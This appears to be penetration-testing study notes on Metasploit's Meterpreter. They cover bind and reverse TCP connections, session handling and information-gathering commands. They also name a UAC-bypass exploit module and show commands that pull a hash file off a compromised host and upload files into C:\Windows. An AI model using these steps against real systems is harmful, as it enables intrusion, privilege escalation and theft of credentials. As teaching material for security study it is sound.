## Meterpreter

+ Provides many useful features which can help a penetration tester further infiltrate the target system and network
+ Provide advanced features than a simple shell.

## Bind and Reverse 

*Meterpreter* can both **wait for a connection** on the target or **connect back** to the attacker machine.

+ It's most used configurations are:
  + *bind_tcp*
  + *reverse_tcp*
 
 **Bind_tcp:** runs a server process on the target machine that waits for connections from the attacker machine.
 
 **Reverse_tcp:** performs a TCP connection back to the attacker machine. This feature could help evade FW rules.
 
 ## Sessions
 
 + You can switch from a Meterpreter session to the console by using **background** command.
 + you can list currently opened sessions by using the **sessions -l** command.
 + to resume a bg session, you have to use the **sessions -i #** command.
 
 
 ### Gather information commands
 
+ The `sysinfo` command lets you retrieve info about the exploited machine.
+ the `ifconfig` command prints the network configuration
+ you can check the routing table with the `route` commnad
+ to know **which user is running** the process exploited , you can use `getuid` command
+ you can use `getsystem` command to escalate privileges.
  +*Note that in modern windows OS, the UAC(user account policy) policy prevents privilege escalation*

You can bypass UAC module
> use exploit/windows/local/bypassuac

### Uploading and Downloading

You can upload and download files by using the homonymous commands

```bash
meterpreter > download hash.log /ruta/del/atacante/
meterpreter > upload /ruta/del/archivo/del/atacante.txt C:\\Windows
```
